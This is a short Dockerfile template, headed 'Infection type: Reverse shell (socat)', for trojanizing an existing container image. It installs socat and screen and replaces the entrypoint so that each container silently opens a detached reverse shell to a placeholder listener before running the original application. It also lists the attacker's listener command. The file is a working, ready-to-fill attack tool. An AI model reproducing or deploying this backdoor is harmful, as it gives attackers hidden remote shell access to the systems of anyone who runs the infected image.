#### Description ############################################################################
# Infection type:  Reverse shell (socat)
# Distribution:    Alpine Linux
# Listener:        socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:<listening_port>
####

FROM <name_of_image_to_infect>

ADD alpine-minirootfs-3.14.2-x86_64.tar.gz /
RUN apk add screen socat
ENTRYPOINT screen -d -m socat TCP:<listening_address>:<listening_port> EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane && <path_to_application_runtime> <original_ENTRYPOINT_command> <original_CMD_command>
